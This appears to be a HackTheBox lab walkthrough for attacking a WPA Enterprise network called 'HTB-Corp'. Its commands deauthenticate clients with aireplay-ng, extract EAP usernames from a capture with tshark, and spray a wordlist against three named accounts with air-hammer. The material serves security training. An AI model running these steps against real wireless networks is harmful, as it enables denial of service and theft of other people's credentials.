# [Generating Usernames](Generating%20Usernames.md)
### What is the username for "Sophia Rose" used in the WPA Enterprise network named "HTB-Corp"?

```sh
sudo -s

airmon-ng start wlan0

airodump-ng -c 1 wlan0mon -c 1 -w htbcorp_capture
```

![](Screenshot%202026-10-05%20at%2015.32.51.png)

```sh
sudo aireplay-ng --deauth 5 -a <BSSID> -c <MAC_client> wlan0mon
```

![](Screenshot%202026-10-05%20at%2015.34.08.png)

```sh
tshark -r htbcorp_capture-01.cap -Y "eap.type==1 && eap.code==2" -T fields -e eap.identity
```

![](Screenshot%202026-10-05%20at%2015.37.36.png)
### What is the password associated with the user Sophia Rose?

```sh
echo "HTB\s.rose" > sop.txt

python2 /opt/air-hammer/air-hammer.py -i wlan0mon -e HTB-Corp -p /opt/wordlist.txt -u sop.txt
```

![](Screenshot%202026-10-05%20at%2015.51.41.png)
### What is the password associated with the user Cindy Walker?

```sh
echo "HTB\c.walker" > sop.txt

python2 /opt/air-hammer/air-hammer.py -i wlan0mon -e HTB-Corp -p /opt/wordlist.txt -u sop.txt
```

![](Screenshot%202026-10-05%20at%2015.52.56.png)
### What is the password associated with the user David Hutson?

```sh
echo "HTB\d.hutson" > sop.txt

python2 /opt/air-hammer/air-hammer.py -i wlan0mon -e HTB-Corp -p /opt/wordlist.txt -u sop.txt
```

![](Screenshot%202026-10-05%20at%2016.04.50.png)